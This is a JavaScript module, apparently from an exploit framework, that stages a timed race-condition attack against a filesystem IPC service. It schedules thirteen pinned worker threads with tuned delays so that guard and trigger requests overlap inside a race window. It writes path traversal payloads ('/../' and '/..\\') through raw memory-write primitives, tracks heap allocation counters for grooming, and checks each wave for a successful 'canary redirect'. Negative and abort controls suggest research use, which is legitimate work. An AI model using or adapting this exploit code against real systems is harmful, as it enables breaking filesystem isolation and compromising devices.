import coreRuntime from "../runtime.mjs";

const {
  FRAME_SENTINEL,
  MCPY,
  SEND,
  SETB,
  SIGNAL,
  SLEEP,
  TICK,
  WAIT,
  allocPage,
  checkWindow,
  closeHandle,
  cmifReply,
  collectSpans,
  extractRoleTimings,
  prepPacket,
  qualifyOverlap,
  read32,
  read64,
  read8,
  readAllocationCounters,
  readFrameResult,
  roleSendCode,
  sendIPC,
  ticksToUs,
  write32,
  write8,
  writeStr,
  writeXDesc
} = coreRuntime;

// ── Wave planning and configuration ───────────────────────────────────────

// Workers are pinned to one core with decreasing priorities so
// dispatch order is deterministic. roleDelays are kept so server-side
// processing overlaps correctly: without them, all 10 initial requests
// arrive as a burst and the server finishes the quick ones before
// W9's sequential sends let the guards/trigger fire.
export function buildPlans(input) {
    const config = input.config;
    let REQ = input.REQ;
    let clearPkt = input.clearPkt;
    let gates = input.gates;
    let pinPkt = input.pinPkt;
    let prePkt = input.prePkt;
    let roleHandles = input.roleHandles;
    let rootSession = input.rootSession;
    let triggerBuf = input.triggerBuf;
    var plans = [];

    for (var i = 0; i < 13; i++) {
        if (config.workerRoles.indexOf(i) < 0) {
            plans.push([SLEEP(0)]);
            continue;
        }

        var steps = [WAIT(gates.masterGate)];

        // W0-W9: stagger with roleDelays for server-side overlap.
        // Priority ordering guarantees dispatch order within the
        // same delay bucket; the delays give long operations (Commit,
        // Read) a head start so they are still in-flight when the
        // guards and trigger fire.
        if (i < 10) {
            steps.push(SLEEP(config.roleDelays[i]));
        }

        // W10-W11 (guards): gate-based, same as timed.
        if (i >= 10 && i < 12) {
            steps.push(WAIT(gates.groupReleasedGate));
            steps.push(SLEEP(config.guardDelays[i - 10]));
        }

        // W12 (trigger): gate-based with abort-guard sampling.
        // No initial sleep: on a single core with the lowest priority,
        // W12 cannot run until all others are blocked. The gate
        // already synchronises with W9's release signal.
        if (i === 12) {
            steps.push(WAIT(gates.groupReleasedGate));
            steps.push(WAIT(gates.guardLaunchedGate));
            steps.push(SLEEP(400000));
            steps.push(MCPY(gates.spacingDecision,
                gates.bottleneckFinished, 4));
            steps.push(WAIT(gates.bottleneckDoneGate));
            steps.push(MCPY(gates.sampledCompleted,
                gates.completedFlag, 4));
            steps.push(MCPY(gates.sampledEarlyHole,
                gates.earlyHole, 4));
            steps.push(MCPY(0n, gates.sampledCompleted, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
            steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
            steps.push(MCPY(0n, gates.spacingDecision, 4));
            steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
        }

        // W9 (release): pin, clear, pre-release probes before its main send.
        if (i === 9) {
            steps.push(TICK(), SEND(pinPkt, rootSession), TICK());
            steps.push(TICK(), SEND(clearPkt, rootSession), TICK());
            steps.push(TICK(), SEND(prePkt, rootSession), TICK());
        }

        // W11: sample bottleneck state and signal the trigger.
        if (i === 11) {
            steps.push(MCPY(gates.earlyHole,
                gates.bottleneckFinished, 4));
            steps.push(SIGNAL(gates.guardLaunchedGate));
        }

        // Every worker: timestamp → send → timestamp.
        steps.push(TICK());
        steps.push(SEND(REQ[i], roleHandles[i]));
        steps.push(TICK());

        // Post-send signals.
        if (i === 1) {
            steps.push(SETB(gates.bottleneckFinished, 1));
            steps.push(SIGNAL(gates.bottleneckDoneGate));
        }

        if (i === 9) {
            steps.push(SIGNAL(gates.groupReleasedGate));
        }

        if (i === 0 || (i >= 2 && i <= 8) ||
            i === 10 || i === 11) {
            steps.push(SETB(gates.completedFlag, 1));
            steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
        }

        plans.push(steps);
    }

    return plans;
}

export function configureProfile(profile, input) {
    const config = input.config;
    let REQ = input.REQ;
    let SCRATCH_DIR = input.SCRATCH_DIR;
    let extentTotal = input.extentTotal;
    let fragmentBufs = input.fragmentBufs;
    let segments = input.segments;
    let selectedDir = input.selectedDir;
    let triggerBuf = input.triggerBuf;
    var payload = new Array(extentTotal);
    var positive = profile === "positive";
    for (var i = 0; i < extentTotal; i++) payload[i] = positive ? 0x42 : 0x2F;
    payload[extentTotal - 1] = 0;

    if (positive) {
        for (var fs = config.POSITIVE_FILL_SEGMENT; fs < 0x2340; fs += config.POSITIVE_FILL_SEGMENT + 1)
            payload[fs] = 0x2F;
        writeIntoPayload(payload, selectedDir, 0x2340);
        for (var i = 0x2340 + selectedDir.length; i < config.EXTENT_SIZE; i++)
            payload[i] = 0x2F;
        writeIntoPayload(payload, "/..\\", 0);
    } else if (profile === "extent-absent" || profile === "extent-present") {
        writeIntoPayload(payload, SCRATCH_DIR + "/", 0);
        for (var i = 0; i < segments.length; i++)
            writeIntoPayload(payload, "/" + segments[i] + "/",
                (i + 1) * config.SLOT_SIZE);
        var basename = profile === "extent-absent" ? "SPAN_ABSENT" : "SPAN_MARKER";
        writeIntoPayload(payload, basename, config.EXTENT_SIZE - basename.length);
    } else {
        writeIntoPayload(payload, "/../", 0);
    }

    var pieces = [];
    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
        pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));
    for (var i = 0; i < pieces[0].length; i++)
        write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
    for (var piece = 1; piece < pieces.length; piece++) {
        for (var k = 0; k < pieces[piece].length; k++)
            write8(fragmentBufs[piece - 1] + BigInt(k),
                BigInt(pieces[piece][k]));
        writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
            pieces[piece].length);
    }
    return {configured: true};
}

export function configurePayload(tailBytes, input) {
    const config = input.config;
    let REQ = input.REQ;
    let fragmentBufs = input.fragmentBufs;
    let triggerBuf = input.triggerBuf;
    var payloadLen = config.MARKER_OFFSET + tailBytes.length + 1;
    var payload = new Array(payloadLen);
    for (var i = 0; i < payloadLen; i++) payload[i] = 0x42;
    payload[0] = 0x2F; payload[1] = 0x2E; payload[2] = 0x2E; payload[3] = 0x5C;
    for (var i = 0; i < tailBytes.length; i++)
        payload[config.MARKER_OFFSET + i] = tailBytes[i];
    payload[payloadLen - 1] = 0;

    var pieces = [];
    for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
        pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));

    for (var i = 0; i < pieces[0].length; i++)
        write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
    for (var piece = 1; piece < pieces.length; piece++) {
        for (var k = 0; k < pieces[piece].length; k++)
            write8(fragmentBufs[piece - 1] + BigInt(k),
                BigInt(pieces[piece][k]));
        writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
            pieces[piece].length);
    }
    return {configured: true};
}

export function writeIntoPayload(payload, text, offset) {
    for (var i = 0; i < text.length; i++)
        payload[offset + i] = text.charCodeAt(i);
}

export function checkPathPairQuiet(path0, size0, path1, size1, input) {
    let savedHandle = input.savedHandle;
    var controlPkt = allocPage(0x2000);
    var p0 = allocPage(0x1000);
    var p1 = allocPage(0x1000);
    writeStr(p0, path0);
    writeStr(p1, path1);
    prepPacket(controlPkt, (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(controlPkt, 8, p0, size0, 0);
    writeXDesc(controlPkt, 16, p1, size1, 1);
    var transport = Number(sendIPC(savedHandle, controlPkt)) >>> 0;
    var result = transport === 0
        ? Number(cmifReply(controlPkt).result) >>> 0 : 0xFFFFFFFF;
    var ok = transport === 0 && result === 0x202;
    if (input.returnDiagnostics === true)
        return {ok: ok, transport: transport, result: result};
    return ok;
}

function snapshotRenamePathBuffers(pathBuffers) {
    if (!pathBuffers) return null;
    var names = ["fillerSource", "fillerDestination",
        "guardSource", "guardDestination"];
    var snapshots = Object.create(null);
    for (var ni = 0; ni < names.length; ni++) {
        var name = names[ni];
        var spec = pathBuffers[name];
        if (!spec || spec.address == null || !Number.isFinite(spec.size)) {
            snapshots[name] = {available: false};
            continue;
        }
        var hash = 0x811C9DC5;
        var firstNul = -1;
        var firstDiff = null;
        for (var offset = 0; offset < spec.size; offset += 4) {
            var word = Number(read32(spec.address + BigInt(offset))) >>> 0;
            for (var byteIndex = 0; byteIndex < 4 &&
                offset + byteIndex < spec.size; byteIndex++) {
                var byte = (word >>> (byteIndex * 8)) & 0xFF;
                var absoluteIndex = offset + byteIndex;
                hash = Math.imul(hash ^ byte, 0x01000193) >>> 0;
                if (byte === 0 && firstNul < 0) firstNul = absoluteIndex;
                var expectedByte = null;
                if (typeof spec.expected === "string") {
                    if (absoluteIndex < spec.expected.length)
                        expectedByte = spec.expected.charCodeAt(absoluteIndex);
                    else if (absoluteIndex === spec.expected.length &&
                        spec.expected.length < spec.size)
                        expectedByte = 0;
                }
                if (expectedByte !== null && byte !== expectedByte &&
                    firstDiff === null) {
                    firstDiff = {offset: absoluteIndex,
                        expected: expectedByte, actual: byte};
                }
            }
        }
        snapshots[name] = {
            available: true,
            hash: hash >>> 0,
            size: spec.size,
            firstNul: firstNul,
            matchesExpected: firstDiff === null,
            firstDiff: firstDiff
        };
    }
    return snapshots;
}

function snapshotRenameDescriptors(REQ, pathBuffers, workerRoles) {
    if (!REQ || !pathBuffers) return null;
    var allRoles = [
        {role: 7, first: "fillerSource", second: "fillerDestination"},
        {role: 8, first: "fillerSource", second: "fillerDestination"},
        {role: 10, first: "guardSource", second: "guardDestination"},
        {role: 11, first: "guardSource", second: "guardDestination"}
    ];
    var roles = workerRoles
        ? allRoles.filter(function(r) {
            return workerRoles.indexOf(r.role) >= 0;
        })
        : allRoles;
    var output = [];
    var allMatch = true;
    for (var ri = 0; ri < roles.length; ri++) {
        var role = roles[ri];
        var record = {role: role.role, descriptors: []};
        var names = [role.first, role.second];
        for (var di = 0; di < 2; di++) {
            var offset = 8 + di * 8;
            var word0 = Number(read32(REQ[role.role] + BigInt(offset))) >>> 0;
            var word1 = Number(read32(REQ[role.role] + BigInt(offset + 4))) >>> 0;
            var spec = pathBuffers[names[di]];
            var address = BigInt(word1) |
                (BigInt((word0 >>> 12) & 0xF) << 32n) |
                (BigInt((word0 >>> 6) & 0x7) << 36n);
            var expectedAddress = spec ? BigInt(spec.address) : null;
            var expectedWord0 = spec
                ? (((spec.size << 16) |
                    (Number((expectedAddress >> 36n) & 0x7n) << 6) |
                    (Number((expectedAddress >> 32n) & 0xFn) << 12) |
                    di) >>> 0)
                : null;
            var expectedWord1 = spec
                ? Number(expectedAddress & 0xFFFFFFFFn) >>> 0 : null;
            var descriptor = {
                word0: word0,
                word1: word1,
                index: word0 & 0x3F,
                size: word0 >>> 16,
                address: address,
                expectedIndex: di,
                expectedSize: spec ? spec.size : null,
                expectedAddress: expectedAddress,
                expectedWord0: expectedWord0,
                expectedWord1: expectedWord1
            };
            descriptor.matchesExpected = Boolean(spec &&
                word0 === expectedWord0 && word1 === expectedWord1);
            if (!descriptor.matchesExpected) allMatch = false;
            record.descriptors.push(descriptor);
        }
        output.push(record);
    }
    return {allMatch: allMatch, roles: output};
}

export function captureRenameInputState(REQ, pathBuffers, workerRoles) {
    return {
        buffers: snapshotRenamePathBuffers(pathBuffers),
        descriptors: snapshotRenameDescriptors(REQ, pathBuffers, workerRoles)
    };
}

export function queryCanaryHealth(input) {
    let canaryPath = input.canaryPath;
    let savedHandle = input.savedHandle;
    let setupPath = input.setupPath;
    let setupPkt = input.setupPkt;
    writeStr(setupPath, canaryPath);
    prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, canaryPath.length + 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);
    var transport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
    if (transport !== 0)
        return { transport: transport, result: 0xFFFFFFFF, type: -1 };
    var reply = cmifReply(setupPkt);
    var type = reply.result === 0
        ? (Number(read32(setupPkt + BigInt(reply.data))) >>> 0) : -1;
    return { transport: transport, result: reply.result, type: type };
}

export function nulWrites(desired) {
    var last = -1;
    for (var i = desired.length - 1; i >= 0; i--) {
        if (desired[i] !== 0) { last = i; break; }
    }
    if (last + 1 >= desired.length) throw new Error("nulWrites: needs trailing zero");
    var ends = [last + 1];
    for (var end = last; end >= 0; end--) {
        if (desired[end] === 0) ends.push(end);
    }
    return ends.map(function(end) {
        var bytes = [];
        for (var i = 0; i < end; i++) bytes.push(desired[i] || 0x42);
        return { end: end, bytes: bytes };
    });
}

// ── Wave result analysis ──────────────────────────────────────────────────

export function analyzeWave(profile, wave, waveData, group, createPinThisWave, input) {
    const config = input.config;
    let REQ = input.REQ;
    let clearPkt = input.clearPkt;
    let clearSendIndex = input.clearSendIndex;
    let gates = input.gates;
    let pinFirstWaveQualified = input.pinFirstWaveQualified;
    let pinHandle = input.pinHandle;
    let pinPkt = input.pinPkt;
    let pinSendIndex = input.pinSendIndex;
    let pktBuf = input.pktBuf;
    let prePkt = input.prePkt;
    let preSendIndex = input.preSendIndex;
    let rootSession = input.rootSession;
    let sendIndices = input.sendIndices;
    let abortControlCanonical = input.abortControlCanonical;
    let canaryPath = input.canaryPath;
    let savedHandle = input.savedHandle;
    let setupPath = input.setupPath;
    let setupPkt = input.setupPkt;
    var renameInputDiagnostics = null;
    if (input.renamePathBuffers && input.renameInputBefore) {
        var renameBufferAfter = snapshotRenamePathBuffers(
            input.renamePathBuffers);
        var renameBufferNames = ["fillerSource", "fillerDestination",
            "guardSource", "guardDestination"];
        var changedRenameBuffers = [];
        var unexpectedRenameBuffers = [];
        for (var rbi = 0; rbi < renameBufferNames.length; rbi++) {
            var bufferName = renameBufferNames[rbi];
            var beforeBuffer = input.renameInputBefore.buffers?.[bufferName];
            var afterBuffer = renameBufferAfter?.[bufferName];
            if (!beforeBuffer?.available || !afterBuffer?.available) {
                unexpectedRenameBuffers.push(bufferName + ":unavailable");
                continue;
            }
            if (beforeBuffer.hash !== afterBuffer.hash)
                changedRenameBuffers.push(bufferName);
            if (!beforeBuffer.matchesExpected || !afterBuffer.matchesExpected) {
                var mismatch = !afterBuffer.matchesExpected
                    ? afterBuffer.firstDiff : beforeBuffer.firstDiff;
                unexpectedRenameBuffers.push(bufferName + "@" +
                    (mismatch ? mismatch.offset : "unknown"));
            }
        }
        var descriptorSnapshot = input.renameInputBefore.descriptors;
        renameInputDiagnostics = {
            before: input.renameInputBefore.buffers,
            after: renameBufferAfter,
            changedBuffers: changedRenameBuffers,
            unexpectedBuffers: unexpectedRenameBuffers,
            descriptors: descriptorSnapshot,
            descriptorsOk: Boolean(descriptorSnapshot?.allMatch),
            buffersUnchanged: changedRenameBuffers.length === 0,
            buffersMatchExpected: unexpectedRenameBuffers.length === 0
        };
    }
    var canonicalResultCode = function(result) {
        var raw = Number(result) >>> 0;
        return raw === 0xFFFFFFFF ? raw : raw & 0x3FFFFF;
    };
    var spans = collectSpans(waveData.frames, sendIndices, config.roleLabels);
    var trigSpan = null;
    for (var si = 0; si < spans.length; si++)
        if (spans[si].name === "trigger") trigSpan = spans[si];
    var overlap = qualifyOverlap(spans, trigSpan, config.overlapRoles,
        config.throughRoles, config.heldRoles);

    var scv = Number(read32(gates.sampledCompleted)) >>> 0;
    var sev = Number(read32(gates.sampledEarlyHole)) >>> 0;
    var ssv = Number(read32(gates.spacingDecision)) >>> 0;
    var triggerAborted = scv !== 0 || sev !== 0 || ssv !== 0;

    var protectedDone = config.protectedRoles.filter(function(role) {
        return Number(read8(gates.roleDoneFlags + BigInt(role))) !== 0;
    }).length;

    var pinSent = roleSendCode(waveData.frames, 9, pinSendIndex) === 0;
    var pinReply;
    if (pinSent) {
        pinReply = cmifReply(pinPkt);
    } else {
        pinReply = { result: 0xFFFFFFFF, moves: [], copies: [] };
    }

    var pinShapeOk = pinReply.result === 0 && (!createPinThisWave ||
        (pinReply.copies.length === 0 && pinReply.moves.length === 1));
    if (createPinThisWave && pinShapeOk) {
        pinHandle = pinReply.moves[0];
    }

    if (createPinThisWave && !pinShapeOk) {
        for (var ph = 0; ph < pinReply.moves.length; ph++) closeHandle(pinReply.moves[ph]);
        for (var ph = 0; ph < pinReply.copies.length; ph++) closeHandle(pinReply.copies[ph]);
    }

    var clearReply;
    if (roleSendCode(waveData.frames, 9, clearSendIndex) === 0) {
        clearReply = cmifReply(clearPkt);
    } else {
        clearReply = { result: 0xFFFFFFFF };
    }

    var preReply;
    if (roleSendCode(waveData.frames, 9, preSendIndex) === 0) {
        preReply = cmifReply(prePkt);
    } else {
        preReply = { result: 0xFFFFFFFF };
    }

    var preStats = null;
    if (preReply.result === 0) {
        preStats = [];
        for (var pi = 0; pi < 16; pi++)
            preStats.push(Number(read64(prePkt + BigInt(preReply.data + pi * 8))));
    }

    var afterStats = readAllocationCounters(rootSession, pktBuf);
    var preReleaseUsed = group.held && preStats
        ? group.held[5] - preStats[5] : null;
    var preProbeStart = preSendIndex > 0
        ? readFrameResult(waveData.frames[9].frame, preSendIndex - 1)
        : FRAME_SENTINEL;
    var preProbeEnd = preSendIndex >= 0
        ? readFrameResult(waveData.frames[9].frame, preSendIndex + 1)
        : FRAME_SENTINEL;
    var preProbeTimingMeasured = preProbeStart !== FRAME_SENTINEL &&
        preProbeEnd !== FRAME_SENTINEL;
    var preProbeTiming = {
        startOffsetUs: preProbeTimingMeasured && trigSpan
            ? ticksToUs(preProbeStart - trigSpan.start) : null,
        durationUs: preProbeTimingMeasured
            ? ticksToUs(preProbeEnd - preProbeStart) : null
    };
    // W9 sends pin/clear/pre inside the race window; their round trips are
    // server-load samples at the critical moment. The TICK steps around each
    // SEND already store the timestamps, so this only reads them back.
    var probeDurationUs = function(sendIndex) {
        if (sendIndex < 0) return null;
        var start = readFrameResult(waveData.frames[9].frame, sendIndex - 1);
        var end = readFrameResult(waveData.frames[9].frame, sendIndex + 1);
        if (start === FRAME_SENTINEL || end === FRAME_SENTINEL) return null;
        return ticksToUs(end - start);
    };
    var pinPersistentBytes = createPinThisWave && afterStats && group.before
        ? group.before[5] - afterStats[5] : null;
    var pinCostOk = !createPinThisWave ||
        pinPersistentBytes === config.PINNING_ALLOCATION_BYTES;
    var restored = Boolean(afterStats && group.before &&
        Math.abs(afterStats[5] +
            (createPinThisWave ? config.PINNING_ALLOCATION_BYTES : 0) -
            group.before[5]) <= config.HEAP_JITTER_BYTES);

    var sendCodes = [];
    for (var ci = 0; ci < sendIndices.length; ci++)
        sendCodes.push(roleSendCode(waveData.frames, ci, sendIndices[ci]));
    var transportOk = sendCodes.filter(function(c) { return c === 0; }).length;
    var resultAt = function(index) {
        if (sendCodes[index] !== 0) {
            return 0xFFFFFFFF;
        }

        return Number(cmifReply(REQ[index]).result) >>> 0;
    };
    var typeAt = function(index, result) {
        if (result !== 0 || sendCodes[index] !== 0) return -1;
        var reply = cmifReply(REQ[index]);
        return Number(read32(REQ[index] + BigInt(reply.data))) >>> 0;
    };

    var commitResult = resultAt(0);
    var readResult = resultAt(1);
    var tailResults = [2, 3, 4, 5].map(resultAt);
    var canaryResult = resultAt(6);
    var canaryType = typeAt(6, canaryResult);
    var triggerResult = resultAt(12);
    var triggerType = typeAt(12, triggerResult);
    var fillerRoles = [7, 8].filter(function(role) {
        return config.workerRoles.indexOf(role) >= 0;
    });
    var fillerResults = fillerRoles.map(resultAt);
    var guardResults = [10, 11].map(resultAt);
    var health = queryCanaryHealth({canaryPath, savedHandle, setupPath, setupPkt});

    var canaryStart = readFrameResult(waveData.frames[6].frame, sendIndices[6] - 1);
    var canaryEnd = readFrameResult(waveData.frames[6].frame, sendIndices[6] + 1);
    var pinStart = readFrameResult(waveData.frames[9].frame, pinSendIndex - 1);
    var pinEnd = readFrameResult(waveData.frames[9].frame, pinSendIndex + 1);
    var pinWindowMeasured = createPinThisWave &&
        canaryStart !== FRAME_SENTINEL && canaryEnd !== FRAME_SENTINEL &&
        pinStart !== FRAME_SENTINEL && pinEnd !== FRAME_SENTINEL;
    var pinWindowOk = pinWindowMeasured &&
        canaryStart < pinStart && pinEnd < canaryEnd;
    var pinStartOffsetUs = pinWindowMeasured
        ? ticksToUs(pinStart - canaryStart) : null;
    var pinEndMarginUs = pinWindowMeasured
        ? ticksToUs(canaryEnd - pinEnd) : null;

    if (createPinThisWave)
        pinFirstWaveQualified = pinShapeOk && pinWindowOk && pinCostOk && restored;

    var changedPaths = [];
    if (canaryResult !== 0 || canaryType !== 1) changedPaths.push("canary");
    for (var fi = 0; fi < fillerResults.length; fi++)
        if (canonicalResultCode(fillerResults[fi]) !== 0x202)
            changedPaths.push(config.roleLabels[fillerRoles[fi]]);
    for (var gi = 0; gi < guardResults.length; gi++)
        if (canonicalResultCode(guardResults[gi]) !== 0x202)
            changedPaths.push("guard" + gi);

    var selectedMarker = triggerResult === 0 && triggerType === 1;
    var observedCanaryRedirect = canaryResult === 0 && canaryType === 0 &&
        changedPaths.length === 1 && changedPaths[0] === "canary";
    var canaryRedirect = observedCanaryRedirect;
    var tailsExpected = tailResults.every(function(r) {
        return r !== 0xFFFFFFFF && (r & 0x3FFFFF) === 0x00320002;
    });
    var reservationExpected = group.reserved === 59 &&
        group.failures.length === 0 && group.outer !== 0;
    var releaseWasSent = sendCodes[9] === 0;
    var isPositiveProfile = profile === "positive" || profile.indexOf("cache") === 0;
    var pathsExpected = fillerResults.every(function(r) {
        var canonical = canonicalResultCode(r);
        return canonical === 0x202 ||
            (isPositiveProfile && canonical === 0x2EEA02);
    }) && guardResults.every(function(r) {
        return canonicalResultCode(r) === 0x202;
    });

    var window = Boolean(reservationExpected &&
        wave.done === config.WORKER_COUNT &&
        transportOk === config.WORKER_COUNT &&
        wave.joined === config.WORKER_COUNT &&
        protectedDone === config.protectedRoles.length &&
        releaseWasSent &&
        Number(wave.signalResult) === 0 && trigSpan &&
        overlap.shapeCount === config.OVERLAP_COUNT &&
        overlap.receiveMarginUs !== null && overlap.receiveMarginUs >= 300 &&
        !triggerAborted && tailsExpected && commitResult === 0 &&
        readResult === 0 && pathsExpected &&
        pinShapeOk && clearReply.result === 0 &&
        preReply.result === 0 && restored && pinCostOk &&
        (!createPinThisWave || pinWindowOk) && pinFirstWaveQualified &&
        preReleaseUsed !== null &&
        preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD);

    var postCanaryHealthy = health.transport === 0 &&
        health.result === 0 && health.type === 1;
    var triggerCanonical = triggerResult & 0x3FFFFF;

    var wc = checkWindow({
        reservation: reservationExpected,
        "workers-done": wave.done === config.WORKER_COUNT,
        transport: transportOk === config.WORKER_COUNT,
        "workers-join": wave.joined === config.WORKER_COUNT,
        "protected": protectedDone === config.protectedRoles.length,
        "release-sent": releaseWasSent,
        signal: Number(wave.signalResult) === 0,
        "trig-span": Boolean(trigSpan),
        "shape": overlap.shapeCount === config.OVERLAP_COUNT,
        "margin>=300": overlap.receiveMarginUs !== null &&
            overlap.receiveMarginUs >= 300,
        "no-abort": !triggerAborted,
        tails: tailsExpected,
        commit: commitResult === 0,
        read: readResult === 0,
        paths: pathsExpected,
        "pin-shape": pinShapeOk,
        "clear-ok": clearReply.result === 0,
        "pre-ok": preReply.result === 0,
        "heap-restore": restored,
        "pin-cost": pinCostOk,
        "pin-window": !createPinThisWave || pinWindowOk,
        "pin-1st": pinFirstWaveQualified,
        "pre-release": preReleaseUsed !== null &&
            preReleaseUsed >= config.WINDOW_MINIMUM_CACHE_HELD
    });
    var roleTimings = extractRoleTimings(spans, trigSpan);
    return {
        shape: overlap.shapeCount,
        shapeMissing: overlap.shapeMissing.slice(),
        margin: overlap.receiveMarginUs !== null
            ? overlap.receiveMarginUs.toFixed(0) : null,
        marginUsRaw: overlap.receiveMarginUs,
        marginSlackUs: overlap.receiveMarginUs !== null
            ? overlap.receiveMarginUs - 300 : null,
        preReleaseSlackBytes: preReleaseUsed !== null
            ? preReleaseUsed - config.WINDOW_MINIMUM_CACHE_HELD : null,
        window: wc.ok,
        rejections: wc.rejections,
        sendCodes: sendCodes,
        cacheCounter5: {
            before: group.before ? group.before[5] : null,
            held: group.held ? group.held[5] : null,
            pre: preStats ? preStats[5] : null,
            after: afterStats ? afterStats[5] : null
        },
        // Full 16-field MemoryReportInfo vectors (peaks cleared on read, so
        // each window summarizes retroactively what happened inside it).
        // Field map: 0-2 pooled buffer (Commit pressure), 3-4+9 buffer
        // manager (content cache), 5 exp heap, 6+10 buffer pool, 7-8 patrol
        // read (background activity), 11 async pooled failures.
        counterVector: {
            before: group.before || null,
            held: group.held || null,
            pre: preStats,
            after: afterStats
        },
        w9Probes: {
            pinUs: probeDurationUs(pinSendIndex),
            clearUs: probeDurationUs(clearSendIndex),
            preUs: probeDurationUs(preSendIndex)
        },
        preProbeTiming: preProbeTiming,
        commitResult: commitResult,
        readResult: readResult,
        tailResults: tailResults,
        roleTimings: roleTimings,
        canaryType: canaryType,
        canaryResult: canaryResult,
        triggerType: triggerType,
        selectedMarker: selectedMarker,
        observedCanaryRedirect: observedCanaryRedirect,
        postCanaryHealth: {
            transport: health.transport,
            result: health.result,
            type: health.type,
            healthy: postCanaryHealthy
        },
        guardSamples: {
            completed: scv,
            earlyHole: sev,
            spacing: ssv
        },
        pathReplyResults: {
            filler0: fillerResults[0],
            filler1: fillerResults[1],
            guard0: guardResults[0],
            guard1: guardResults[1]
        },
        renameInputDiagnostics: renameInputDiagnostics,
        pinDiagnostics: {
            created: createPinThisWave,
            result: pinReply.result,
            moves: pinReply.moves.length,
            copies: pinReply.copies.length,
            persistentBytes: pinPersistentBytes,
            expectedBytes: config.PINNING_ALLOCATION_BYTES,
            shapeOk: pinShapeOk,
            costOk: pinCostOk,
            windowMeasured: pinWindowMeasured,
            windowOk: pinWindowOk,
            startOffsetUs: pinStartOffsetUs,
            endMarginUs: pinEndMarginUs,
            restored: restored
        },
        canaryRedirect: profile === "positive" && wc.ok && canaryRedirect && postCanaryHealthy,
        extentQualified: profile === "extent-present" && wc.ok && selectedMarker &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        negativeControl: profile === "negative" && window && !triggerAborted &&
            triggerCanonical === 0x2EEC02 && canaryResult === 0 &&
            canaryType === 1 && postCanaryHealthy,
        abortControl: triggerAborted && scv === 1 &&
            triggerCanonical === abortControlCanonical &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        abortHoleControl: triggerAborted && sev === 1 && ssv === 1 &&
            triggerCanonical === abortControlCanonical &&
            canaryResult === 0 && canaryType === 1 && postCanaryHealthy,
        changedPaths: changedPaths,
        preReleaseUsed: preReleaseUsed,
        triggerAborted: triggerAborted,
        triggerResult: triggerResult,
        triggerCanonical: triggerCanonical,
        pinHandle: pinHandle,
        pinFirstWaveQualified: pinFirstWaveQualified
    };
}
